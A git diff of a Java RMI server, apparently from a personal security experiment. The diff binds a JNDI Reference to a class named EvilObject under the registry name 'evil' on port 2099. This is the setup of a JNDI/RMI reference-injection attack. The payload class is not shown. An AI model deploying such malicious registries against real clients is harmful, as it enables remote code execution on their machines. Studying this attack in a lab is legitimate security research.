@@ -1,5 +1,8 @@
 package top.lovelily.remote;
 
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 import java.rmi.server.UnicastRemoteObject;
@@ -13,14 +16,24 @@ import java.rmi.server.UnicastRemoteObject;
 public class RemoteServer {
     public static void main(String[] args) {
         try {
-            System.setProperty("java.rmi.server.hostname","192.168.50.56");
+            // -Djava.security.manager -Djava.security.policy=E:\IdeaProjects\Test\src\main\resources\my.policy
+            System.out.println(System.getSecurityManager() == null);
+            if (System.getSecurityManager() == null) {
+                System.setSecurityManager(new SecurityManager());
+            }
 
-            Hello obj = new EvilObject();
-            Hello remote  = (Hello) UnicastRemoteObject.exportObject(obj, 8999);
+         //   System.setProperty("java.")
+            LocateRegistry.createRegistry(2099);
+            Registry registry = LocateRegistry.getRegistry(2099);
 
+//            Hello obj = new EvilObject();
+//            Hello remote  = (Hello) UnicastRemoteObject.exportObject(obj, 2099);
+
+            Reference ref = new Reference("top.lovelily.remote.EvilObject", "top.lovelily.remote.EvilObject", null);
+            ReferenceWrapper remote = new ReferenceWrapper(ref);
+
+            registry.rebind("evil", remote);
             System.out.println("启动 RMI 服务端");
-            Registry registry = LocateRegistry.getRegistry();
-            registry.bind("evil", remote);
         } catch (Exception e) {
             e.printStackTrace();
         }
